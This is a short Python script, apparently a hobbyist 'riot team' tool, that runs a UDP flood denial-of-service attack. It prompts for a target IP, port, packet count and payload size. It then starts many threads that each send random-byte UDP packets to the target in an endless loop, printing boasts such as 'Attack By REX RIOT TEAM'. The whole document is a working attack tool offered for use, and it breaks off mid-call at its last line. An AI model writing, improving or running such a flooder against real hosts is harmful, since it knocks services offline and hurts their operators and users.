import random
import socket
import threading
import os,sys

os.system("clear")
print("""\033[91m
██████╗░███████╗██╗░░██╗
██╔══██╗██╔════╝╚██╗██╔╝
██████╔╝█████╗░░░╚███╔╝░
██╔══██╗██╔══╝░░░██╔██╗░
██║░░██║███████╗██╔╝╚██╗
╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

""")

p1 = str(input("\033[0mIP BG GANTENG  : "))
p2 = int(input("\033[0mPORT BG GANTENG  : "))
p3 = int(input("\033[0mPAKET NYA BG : "))
p4 = int(input("\033[0mURANDOM : "))
os.system("clear")
def ddos():
    pe = random._urandom(p4)
    i = random.choice(("\033[91m[Attack By]","\033[91m[Attack By]","\033[91m[Attack By]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            pe2 = (str(p1),int(p2))
            for x in range(p3):
                s.sendto(pe,pe2)
            print(i +"\033[94m REX RIOT TEAM!!!")
        except:
            print("\033[91m[!] YEH DOWN ASUH!!!")

for y in range(p3):
  th = threading.Thread(target = ddos)
  th.start(
